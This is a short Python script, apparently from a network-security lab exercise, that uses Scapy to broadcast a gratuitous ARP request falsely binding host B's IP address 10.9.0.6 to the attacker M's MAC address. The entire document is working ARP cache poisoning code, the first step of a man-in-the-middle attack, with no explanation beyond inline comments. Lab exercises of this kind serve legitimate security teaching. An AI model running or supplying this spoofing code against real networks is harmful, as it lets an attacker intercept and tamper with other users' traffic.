from scapy.all import *

# Set up Ethernet frame
E = Ether()  
E.dst = "ff:ff:ff:ff:ff:ff" # Broadcast to all devices 

# Set up ARP packet as a gratuitous ARP request
A = ARP()
A.op = 1  # ARP request, but no response is expected
A.psrc = "10.9.0.6"            # B’s IP address
A.pdst = "10.9.0.6"            # B’s IP address
A.hwsrc = "02:42:0a:09:00:69"  # M’s MAC address (attacker’s MAC)
A.hwdst = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC

# Construct and send the packet
pkt = E/A
sendp(pkt)
